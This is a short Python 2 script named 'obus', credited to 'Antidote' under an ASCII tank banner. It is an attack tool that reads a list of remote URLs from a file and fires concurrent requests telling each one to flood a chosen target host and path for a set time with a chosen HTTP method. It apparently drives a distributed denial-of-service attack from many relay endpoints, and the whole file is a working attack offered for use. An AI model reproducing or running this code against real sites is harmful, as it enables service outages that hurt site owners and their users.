# exp: obus.py site.org index.php 9999 GET|POST|PUT|DELETE|PATCH
import grequests
import sys
obusv1 = """\
   [ O ]
     \ \      p
      \ \  \o/
       \ \--'---_
       /\ \   / ~~\_
 ./---/__|=/_/------//~~~\                       Coded By Antidote
/___________________/O   O \              Using Python 2.7 & Grequests
(===(\_________(===(Oo o o O)          
 \~~~\____/     \---\Oo__o--
   ~~~~~~~       ~~~~~~~~~~
"""
print obusv1
print("Starting System.")
urls=[line.strip() for line in open('http.txt')]
rs = (grequests.get(u+"?host="+sys.argv[1]+"&dizin="+sys.argv[2]+"&time="+sys.argv[3]+"&method="+sys.argv[4]) for u in urls)
grequests.map(rs)
